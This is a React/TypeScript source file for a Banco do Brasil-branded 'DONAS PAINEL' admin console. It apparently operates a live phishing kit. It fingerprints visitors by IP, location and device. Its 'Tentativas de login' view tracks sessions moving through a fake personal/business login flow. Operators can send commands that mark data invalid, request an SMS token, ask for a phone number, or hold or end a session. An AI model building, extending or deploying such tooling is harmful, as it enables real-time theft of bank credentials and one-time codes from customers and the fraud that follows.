import { useEffect, useState, type FormEvent } from 'react';
import {
  Activity,
  ArrowRight,
  Eye,
  EyeOff,
  LayoutDashboard,
  ListChecks,
  Lock,
  LogOut,
  Settings,
  ShieldCheck,
  User,
  Users,
} from 'lucide-react';

const TOKEN_KEY = 'donas-admin-token';

type AuthState =
  | { status: 'checking' }
  | { status: 'guest' }
  | { status: 'authed'; username: string };

async function apiFetch(path: string, init?: RequestInit) {
  return fetch(`/api${path}`, init);
}

function DonasLogin({ onLogin }: { onLogin: (username: string, token: string) => void }) {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [loading, setLoading] = useState(false);

  const handleSubmit = async (event: FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    setError(null);
    setLoading(true);
    try {
      const response = await apiFetch('/admin/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username, password }),
      });
      const data = await response.json().catch(() => ({}));
      if (response.ok && data.token) {
        onLogin(data.username ?? username, data.token);
      } else {
        setError(data.message ?? 'Não foi possível entrar. Tente novamente.');
      }
    } catch {
      setError('Falha de conexão. Tente novamente.');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="donas-auth" data-testid="donas-login">
      <aside className="donas-hero" aria-hidden="true">
        <div className="donas-hero-overlay" />
        <div className="donas-hero-footer">
          <span className="donas-badge">
            <ShieldCheck size={13} />
            ACESSO RESTRITO
          </span>
          <p className="donas-quote">
            Painel administrativo — acesso monitorado e restrito a operadores autorizados.
          </p>
        </div>
      </aside>

      <section className="donas-panel">
        <form className="donas-card" onSubmit={handleSubmit}>
          <div className="donas-brand">
            <span className="donas-brand-mark">BB</span>
            <span className="donas-brand-text">
              <strong>Banco do Brasil</strong>
              <small>DONAS PAINEL</small>
            </span>
          </div>

          <h1 className="donas-title">Acessar painel</h1>
          <p className="donas-subtitle">Digite suas credenciais para continuar.</p>

          <label className="donas-label" htmlFor="donas-user">USUÁRIO</label>
          <div className="donas-input-wrap">
            <User size={16} className="donas-input-icon" />
            <input
              id="donas-user"
              className="donas-input"
              type="text"
              autoComplete="username"
              placeholder="seu usuário"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              data-testid="donas-input-user"
              required
            />
          </div>

          <label className="donas-label" htmlFor="donas-pass">SENHA</label>
          <div className="donas-input-wrap">
            <Lock size={16} className="donas-input-icon" />
            <input
              id="donas-pass"
              className="donas-input"
              type={showPassword ? 'text' : 'password'}
              autoComplete="current-password"
              placeholder="sua senha"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              data-testid="donas-input-pass"
              required
            />
            <button
              type="button"
              className="donas-eye"
              onClick={() => setShowPassword((s) => !s)}
              aria-label={showPassword ? 'Ocultar senha' : 'Mostrar senha'}
              data-testid="donas-toggle-pass"
            >
              {showPassword ? <EyeOff size={16} /> : <Eye size={16} />}
            </button>
          </div>

          {error && (
            <p className="donas-error" role="alert" data-testid="donas-error">{error}</p>
          )}

          <button className="donas-submit" type="submit" disabled={loading} data-testid="donas-submit">
            {loading ? 'Entrando…' : 'Entrar'}
            <ArrowRight size={16} />
          </button>

          <p className="donas-footer">
            <ShieldCheck size={13} />
            Conexão segura · Apenas administradores autorizados
          </p>
        </form>
      </section>
    </div>
  );
}

const MENU = [
  { key: 'dashboard', label: 'Dashboard', icon: LayoutDashboard },
  { key: 'tentativas', label: 'Tentativas de login', icon: ListChecks },
  { key: 'acessos', label: 'Acessos', icon: Activity },
  { key: 'sessoes', label: 'Visitantes/Sessões', icon: Users },
  { key: 'config', label: 'Configurações', icon: Settings },
] as const;

const authHeaders = (): Record<string, string> => {
  const t = localStorage.getItem(TOKEN_KEY);
  return t ? { Authorization: `Bearer ${t}` } : {};
};

interface AccessItem {
  id: string;
  route: string;
  login?: string | null;
  status?: string | null;
  ip: string | null;
  browser: string | null;
  deviceType: string | null;
  os: string | null;
  language: string | null;
  timezone: string | null;
  screen: string | null;
  referrer: string | null;
  userAgent: string | null;
  location: string | null;
  createdAt: string;
}
interface Stats {
  total: number;
  today: number;
  lastHour: number;
  last7days: number;
  byHour: { hour: string; count: number }[];
  topRoutes: { route: string; count: number }[];
  recent: AccessItem[];
}

const timeAgo = (iso: string) => {
  const diff = Date.now() - new Date(iso).getTime();
  const m = Math.floor(diff / 60000);
  if (m < 1) return 'agora';
  if (m < 60) return `${m} min atrás`;
  const h = Math.floor(m / 60);
  if (h < 24) return `${h}h atrás`;
  return `${Math.floor(h / 24)}d atrás`;
};

function AccessDetailModal({ item, onClose }: { item: AccessItem; onClose: () => void }) {
  return (
    <div className="donas-modal-backdrop" onClick={onClose} data-testid="access-detail-modal">
      <div className="donas-modal" onClick={(e) => e.stopPropagation()}>
        <div className="donas-modal-head">
          <h3>● Detalhes do acesso</h3>
          <button type="button" onClick={onClose} aria-label="Fechar" data-testid="access-detail-close">×</button>
        </div>
        <dl className="donas-modal-body">
          {item.status != null && (
            <div><dt>Status</dt><dd><span className={`donas-status donas-status--${item.status}`}>{item.status}</span></dd></div>
          )}
          {item.login != null && (
            <div><dt>Login/Identificador</dt><dd>{item.login || '-'}</dd></div>
          )}
          <div><dt>Rota</dt><dd>{item.route}</dd></div>
          <div><dt>Quando</dt><dd>{new Date(item.createdAt).toLocaleString('pt-BR')}</dd></div>
          <div><dt>IP</dt><dd>{item.ip ?? '-'}</dd></div>
          <div><dt>Local (aprox.)</dt><dd>{item.location ?? '-'}</dd></div>
          <div><dt>Navegador</dt><dd>{item.browser ?? '-'}</dd></div>
          <div><dt>Dispositivo</dt><dd>{item.deviceType ?? '-'}</dd></div>
          <div><dt>Sistema</dt><dd>{item.os ?? '-'}</dd></div>
          <div><dt>User-Agent</dt><dd className="donas-ua">{item.userAgent ?? '-'}</dd></div>
          <div><dt>Tela</dt><dd>{item.screen ?? '-'}</dd></div>
          <div><dt>Idioma</dt><dd>{item.language ?? '-'}</dd></div>
          <div><dt>Fuso</dt><dd>{item.timezone ?? '-'}</dd></div>
          <div><dt>Referrer</dt><dd>{item.referrer || '(direto)'}</dd></div>
        </dl>
        <div className="donas-modal-foot">
          <button type="button" className="donas-mini-btn" onClick={() => navigator.clipboard?.writeText(JSON.stringify(item, null, 2))}>Copiar JSON</button>
          <button type="button" className="donas-submit donas-submit--sm" onClick={onClose}>Fechar</button>
        </div>
      </div>
    </div>
  );
}

function DashboardView({ onOpen }: { onOpen: (a: AccessItem) => void }) {
  const [stats, setStats] = useState<Stats | null>(null);
  useEffect(() => {
    let alive = true;
    const load = () => fetch('/api/access/stats', { headers: authHeaders() })
      .then((r) => (r.ok ? r.json() : null))
      .then((d) => { if (alive && d) setStats(d); })
      .catch(() => {});
    load();
    const id = setInterval(load, 5000);
    return () => { alive = false; clearInterval(id); };
  }, []);
  const max = Math.max(1, ...(stats?.byHour.map((b) => b.count) ?? [1]));
  const topMax = Math.max(1, ...(stats?.topRoutes.map((t) => t.count) ?? [1]));
  return (
    <div className="donas-dash" data-testid="dash-view">
      <div className="donas-cards">
        {[
          { l: 'TOTAL DE ACESSOS', v: stats?.total, s: 'All-time' },
          { l: 'HOJE', v: stats?.today, s: 'Ao vivo' },
          { l: 'ÚLTIMA HORA', v: stats?.lastHour, s: '60 min' },
          { l: 'ÚLTIMOS 7 DIAS', v: stats?.last7days, s: 'Semana' },
        ].map((c) => (
          <div className="donas-card-stat" key={c.l}>
            <span className="donas-card-label">{c.l}</span>
            <strong data-testid={`stat-${c.l}`}>{c.v ?? '—'}</strong>
            <small>{c.s}</small>
          </div>
        ))}
      </div>
      <div className="donas-panels">
        <div className="donas-block">
          <h3>Tráfego nas últimas 24h</h3>
          <div className="donas-bars">
            {(stats?.byHour ?? []).map((b, i) => (
              <div className="donas-bar-col" key={i} title={`${b.hour}: ${b.count}`}>
                <div className="donas-bar" style={{ height: `${(b.count / max) * 100}%` }} />
                <span>{b.hour}</span>
              </div>
            ))}
          </div>
        </div>
        <div className="donas-block">
          <h3>Páginas mais acessadas</h3>
          <ul className="donas-top">
            {(stats?.topRoutes ?? []).map((t) => (
              <li key={t.route}>
                <span className="donas-top-route">{t.route}</span>
                <span className="donas-top-bar"><i style={{ width: `${(t.count / topMax) * 100}%` }} /></span>
                <span className="donas-top-count">{t.count}</span>
              </li>
            ))}
          </ul>
        </div>
      </div>
      <div className="donas-block">
        <h3>Acessos recentes <small>clique para ver detalhes</small></h3>
        <ul className="donas-recent">
          {(stats?.recent ?? []).map((a) => (
            <li key={a.id} onClick={() => onOpen(a)} data-testid="recent-row">
              <span className="donas-recent-route">{a.route}</span>
              <span className="donas-recent-meta">{a.browser} · {a.ip} · {timeAgo(a.createdAt)}</span>
              <span className="donas-tag">{a.location}</span>
            </li>
          ))}
        </ul>
      </div>
    </div>
  );
}

function AcessosView({ onOpen }: { onOpen: (a: AccessItem) => void }) {
  const [items, setItems] = useState<AccessItem[]>([]);
  const [q, setQ] = useState('');
  useEffect(() => {
    let alive = true;
    const load = () => fetch(`/api/access/list?q=${encodeURIComponent(q)}`, { headers: authHeaders() })
      .then((r) => (r.ok ? r.json() : null))
      .then((d) => { if (alive && d) setItems(d.items); })
      .catch(() => {});
    load();
    const id = setInterval(load, 5000);
    return () => { alive = false; clearInterval(id); };
  }, [q]);
  const exportCsv = async () => {
    const r = await fetch('/api/access/export', { headers: authHeaders() });
    const blob = await r.blob();
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url; a.download = 'acessos.csv'; a.click();
    URL.revokeObjectURL(url);
  };
  return (
    <div className="donas-acessos" data-testid="acessos-view">
      <div className="donas-toolbar">
        <input
          className="donas-search"
          placeholder="Buscar IP, rota, navegador…"
          value={q}
          onChange={(e) => setQ(e.target.value)}
          data-testid="acessos-search"
        />
        <button type="button" className="donas-mini-btn" onClick={exportCsv} data-testid="acessos-export">Exportar CSV</button>
      </div>
      <div className="donas-table-wrap">
        <table className="donas-table">
          <thead>
            <tr><th>#</th><th>Rota</th><th>IP</th><th>Navegador</th><th>Dispositivo</th><th>Idioma</th><th>Fuso</th><th>Quando</th></tr>
          </thead>
          <tbody>
            {items.map((a, i) => (
              <tr key={a.id} onClick={() => onOpen(a)} data-testid="acessos-row">
                <td>{i + 1}</td><td>{a.route}</td><td>{a.ip}</td><td>{a.browser}</td>
                <td>{a.deviceType}</td><td>{a.language}</td><td>{a.timezone}</td><td>{timeAgo(a.createdAt)}</td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>
    </div>
  );
}

interface SessionStep {
  route: string;
  label: string | null;
  at: string;
}
interface SessionHistoryEntry {
  type: string;
  label: string;
  at: string;
}
interface LoginSession {
  id: string;
  sessionId: string;
  flowType: 'PF' | 'PJ' | null;
  identifier: string | null;
  currentStep: string | null;
  status: string;
  directive: string;
  steps: SessionStep[];
  history: SessionHistoryEntry[];
  ip: string | null;
  browser: string | null;
  deviceType: string | null;
  os: string | null;
  language: string | null;
  timezone: string | null;
  screen: string | null;
  referrer: string | null;
  userAgent: string | null;
  location: string | null;
  createdAt: string;
  updatedAt: string;
}

const DIRECTIVE_LABELS: Record<string, string> = {
  none: 'Nenhuma',
  hold: 'Em aguarde',
  invalid: 'Dados inválidos',
  sms_token: 'Token SMS',
  ask_phone: 'Pedir telefone',
  ended: 'Encerrada',
};

const SESSION_COMMANDS = [
  { key: 'invalid', label: 'Dados inválidos' },
  { key: 'sms_token', label: 'Token SMS' },
  { key: 'ask_phone', label: 'Pedir telefone' },
  { key: 'hold', label: 'Colocar em aguarde' },
] as const;

const flowLabel = (f: LoginSession['flowType']) =>
  f === 'PF' ? 'Pessoa Física' : f === 'PJ' ? 'Pessoa Jurídica' : 'Indefinido';

function SessionHistoryModal({ session, onClose }: { session: LoginSession; onClose: () => void }) {
  const events = [
    ...session.steps.map((s) => ({
      kind: 'step' as const,
      label: `${s.route}${s.label ? ` — ${s.label}` : ''}`,
      at: s.at,
    })),
    ...session.history.map((h) => ({ kind: h.type, label: h.label, at: h.at })),
  ].sort((a, b) => new Date(a.at).getTime() - new Date(b.at).getTime());

  return (
    <div className="donas-modal-backdrop" onClick={onClose} data-testid="session-history-modal">
      <div className="donas-modal" onClick={(e) => e.stopPropagation()}>
        <div className="donas-modal-head">
          <h3>● Histórico da sessão</h3>
          <button type="button" onClick={onClose} aria-label="Fechar" data-testid="session-history-close">×</button>
        </div>
        <div className="donas-modal-body">
          <div>
            <dt>Identificador</dt>
            <dd>{session.identifier ?? '-'}</dd>
          </div>
          <div>
            <dt>Fluxo</dt>
            <dd>{flowLabel(session.flowType)}</dd>
          </div>
          <div style={{ display: 'block' }}>
            <ul className="donas-timeline" data-testid="session-history-list">
              {events.map((e, i) => (
                <li key={i} className={`donas-timeline-item donas-timeline-item--${e.kind}`}>
                  <span className="donas-timeline-dot" aria-hidden="true" />
                  <div>
                    <strong>{e.label}</strong>
                    <small>{new Date(e.at).toLocaleString('pt-BR')}</small>
                  </div>
                </li>
              ))}
              {events.length === 0 && <li className="donas-timeline-empty">Sem eventos ainda.</li>}
            </ul>
          </div>
        </div>
        <div className="donas-modal-foot">
          <button type="button" className="donas-submit donas-submit--sm" onClick={onClose}>Fechar</button>
        </div>
      </div>
    </div>
  );
}

function SessionBlock({
  session,
  expanded,
  onToggle,
  onCommand,
  onHistory,
}: {
  session: LoginSession;
  expanded: boolean;
  onToggle: () => void;
  onCommand: (id: string, command: string) => void;
  onHistory: () => void;
}) {
  const ended = session.status === 'ended';
  return (
    <div className={`donas-session${ended ? ' is-ended' : ''}`} data-testid="session-block">
      <button type="button" className="donas-session-head" onClick={onToggle} data-testid="session-head">
        <span className={`donas-flow-badge donas-flow-badge--${session.flowType ?? 'NA'}`}>
          {session.flowType ?? '?'}
        </span>
        <span className="donas-session-title">
          <strong>{session.identifier || `Sessão ${session.sessionId.slice(0, 8)}`}</strong>
          <small>{session.currentStep ?? '-'}</small>
        </span>
        <span className="donas-session-tags">
          <span className={`donas-status donas-status--${ended ? 'failed' : 'submitted'}`}>
            {ended ? 'encerrada' : 'ativa'}
          </span>
          <span className="donas-tag">{DIRECTIVE_LABELS[session.directive] ?? session.directive}</span>
        </span>
        <span className="donas-session-meta">
          {session.browser} · {session.os} · {session.ip} · {timeAgo(session.updatedAt)}
        </span>
        <span className="donas-session-chevron">{expanded ? '▾' : '▸'}</span>
      </button>

      {expanded && (
        <div className="donas-session-body" data-testid="session-body">
          <div className="donas-kv-grid">
            <div><dt>Fluxo</dt><dd>{flowLabel(session.flowType)}</dd></div>
            <div><dt>Identificador</dt><dd>{session.identifier ?? '-'}</dd></div>
            <div><dt>IP</dt><dd>{session.ip ?? '-'}</dd></div>
            <div><dt>Local</dt><dd>{session.location ?? '-'}</dd></div>
            <div><dt>Navegador</dt><dd>{session.browser ?? '-'}</dd></div>
            <div><dt>Dispositivo</dt><dd>{session.deviceType ?? '-'}</dd></div>
            <div><dt>Sistema</dt><dd>{session.os ?? '-'}</dd></div>
            <div><dt>Tela</dt><dd>{session.screen ?? '-'}</dd></div>
            <div><dt>Idioma</dt><dd>{session.language ?? '-'}</dd></div>
            <div><dt>Fuso</dt><dd>{session.timezone ?? '-'}</dd></div>
            <div><dt>Início</dt><dd>{new Date(session.createdAt).toLocaleString('pt-BR')}</dd></div>
            <div><dt>Atualizado</dt><dd>{new Date(session.updatedAt).toLocaleString('pt-BR')}</dd></div>
          </div>

          <h4 className="donas-section-title">Etapas do fluxo</h4>
          <ul className="donas-timeline donas-timeline--compact">
            {session.steps.map((s, i) => (
              <li key={i} className="donas-timeline-item donas-timeline-item--step">
                <span className="donas-timeline-dot" aria-hidden="true" />
                <div>
                  <strong>{s.route}{s.label ? ` — ${s.label}` : ''}</strong>
                  <small>{new Date(s.at).toLocaleString('pt-BR')}</small>
                </div>
              </li>
            ))}
            {session.steps.length === 0 && <li className="donas-timeline-empty">Sem etapas ainda.</li>}
          </ul>

          <h4 className="donas-section-title">COMANDOS</h4>
          <div className="donas-cmd-grid" data-testid="session-commands">
            {SESSION_COMMANDS.map((c) => (
              <button
                key={c.key}
                type="button"
                className={`donas-cmd-btn${session.directive === c.key ? ' is-active' : ''}`}
                disabled={ended}
                onClick={() => onCommand(session.id, c.key)}
                data-testid={`session-cmd-${c.key}`}
              >
                {c.label}
              </button>
            ))}
            <button
              type="button"
              className="donas-cmd-btn donas-cmd-btn--danger"
              disabled={ended}
              onClick={() => {
                if (window.confirm('Encerrar esta sessão? Esta ação inativa apenas esta sessão.')) {
                  onCommand(session.id, 'end');
                }
              }}
              data-testid="session-cmd-end"
            >
              Encerrar
            </button>
            <button
              type="button"
              className="donas-cmd-btn donas-cmd-btn--ghost"
              onClick={onHistory}
              data-testid="session-cmd-history"
            >
              Histórico
            </button>
          </div>
        </div>
      )}
    </div>
  );
}

function TentativasView() {
  const [items, setItems] = useState<LoginSession[]>([]);
  const [q, setQ] = useState('');
  const [expandedId, setExpandedId] = useState<string | null>(null);
  const [historyFor, setHistoryFor] = useState<LoginSession | null>(null);

  const load = () =>
    fetch('/api/auth-attempt/list', { headers: authHeaders() })
      .then((r) => (r.ok ? r.json() : null))
      .then((d) => { if (d) setItems(d.items); })
      .catch(() => {});

  useEffect(() => {
    let alive = true;
    const run = () => { if (alive) load(); };
    run();
    const id = setInterval(run, 4000);
    return () => { alive = false; clearInterval(id); };
  }, []);

  const sendCommand = async (id: string, command: string) => {
    await fetch('/api/auth-attempt/command', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', ...authHeaders() },
      body: JSON.stringify({ id, command }),
    }).catch(() => {});
    load();
  };

  const term = q.trim().toLowerCase();
  const filtered = term
    ? items.filter((s) =>
        [s.identifier, s.currentStep, s.ip, s.browser, s.flowType, s.status].some((v) =>
          (v ?? '').toLowerCase().includes(term)))
    : items;

  return (
    <div className="donas-acessos" data-testid="tentativas-view">
      <div className="donas-toolbar">
        <input
          className="donas-search"
          placeholder="Buscar identificador, etapa, IP, navegador, PF/PJ…"
          value={q}
          onChange={(e) => setQ(e.target.value)}
          data-testid="tentativas-search"
        />
        <span className="donas-mini-btn" style={{ cursor: 'default' }}>{filtered.length} sessões</span>
      </div>

      <div className="donas-sessions" data-testid="sessions-list">
        {filtered.map((s) => (
          <SessionBlock
            key={s.id}
            session={s}
            expanded={expandedId === s.id}
            onToggle={() => setExpandedId(expandedId === s.id ? null : s.id)}
            onCommand={sendCommand}
            onHistory={() => setHistoryFor(s)}
          />
        ))}
        {filtered.length === 0 && (
          <div className="donas-empty">
            <ListChecks size={28} />
            <h2>Nenhuma sessão</h2>
            <p>As sessões dos visitantes aparecerão aqui em tempo real conforme percorrem o fluxo.</p>
          </div>
        )}
      </div>

      {historyFor && (
        <SessionHistoryModal
          session={items.find((s) => s.id === historyFor.id) ?? historyFor}
          onClose={() => setHistoryFor(null)}
        />
      )}
    </div>
  );
}

function DonasDashboard({ username, onLogout }: { username: string; onLogout: () => void }) {
  const [active, setActive] = useState<(typeof MENU)[number]['key']>('dashboard');
  const [detail, setDetail] = useState<AccessItem | null>(null);
  const current = MENU.find((m) => m.key === active) ?? MENU[0];

  return (
    <div className="donas-shell" data-testid="donas-dashboard">
      <aside className="donas-sidebar">
        <div className="donas-brand donas-brand--sidebar">
          <span className="donas-brand-mark">BB</span>
          <span className="donas-brand-text">
            <strong>Banco do Brasil</strong>
            <small>DONAS PAINEL</small>
          </span>
        </div>
        <nav className="donas-nav">
          {MENU.map((item) => {
            const Icon = item.icon;
            return (
              <button
                key={item.key}
                type="button"
                className={`donas-nav-item${active === item.key ? ' is-active' : ''}`}
                onClick={() => setActive(item.key)}
                data-testid={`donas-menu-${item.key}`}
              >
                <Icon size={18} />
                {item.label}
              </button>
            );
          })}
        </nav>
        <button type="button" className="donas-logout" onClick={onLogout} data-testid="donas-logout">
          <LogOut size={16} />
          Sair
        </button>
      </aside>

      <main className="donas-main">
        <header className="donas-topbar">
          <h1>{current.label}</h1>
          <span className="donas-live">● Ao vivo · atualizando a cada 5s</span>
          <span className="donas-user"><User size={15} />{username}</span>
        </header>
        <section className="donas-content">
          {active === 'dashboard' && <DashboardView onOpen={setDetail} />}
          {active === 'acessos' && <AcessosView onOpen={setDetail} />}
          {active === 'tentativas' && <TentativasView />}
          {active !== 'dashboard' && active !== 'acessos' && active !== 'tentativas' && (
            <div className="donas-empty">
              <current.icon size={30} />
              <h2>{current.label}</h2>
              <p>Estrutura inicial. Esta seção será implementada nas próximas etapas.</p>
            </div>
          )}
        </section>
      </main>
      {detail && <AccessDetailModal item={detail} onClose={() => setDetail(null)} />}
    </div>
  );
}

export default function DonasPainel() {
  const [auth, setAuth] = useState<AuthState>({ status: 'checking' });

  useEffect(() => {
    let cancelled = false;
    const token = localStorage.getItem(TOKEN_KEY);
    if (!token) {
      setAuth({ status: 'guest' });
      return;
    }
    apiFetch('/admin/me', { headers: { Authorization: `Bearer ${token}` } })
      .then(async (r) => {
        if (cancelled) return;
        if (r.ok) {
          const d = await r.json();
          setAuth({ status: 'authed', username: d.username });
        } else {
          localStorage.removeItem(TOKEN_KEY);
          setAuth({ status: 'guest' });
        }
      })
      .catch(() => {
        if (!cancelled) setAuth({ status: 'guest' });
      });
    return () => {
      cancelled = true;
    };
  }, []);

  const handleLogin = (usernameValue: string, token: string) => {
    localStorage.setItem(TOKEN_KEY, token);
    setAuth({ status: 'authed', username: usernameValue });
  };

  const handleLogout = async () => {
    const token = localStorage.getItem(TOKEN_KEY);
    localStorage.removeItem(TOKEN_KEY);
    setAuth({ status: 'guest' });
    try {
      await apiFetch('/admin/logout', {
        method: 'POST',
        headers: token ? { Authorization: `Bearer ${token}` } : undefined,
      });
    } catch {
      /* logout é stateless no servidor */
    }
  };

  if (auth.status === 'checking') {
    return <div className="donas-checking" data-testid="donas-checking">Carregando…</div>;
  }
  if (auth.status !== 'authed') {
    return <DonasLogin onLogin={handleLogin} />;
  }
  return <DonasDashboard username={auth.username} onLogout={handleLogout} />;
}
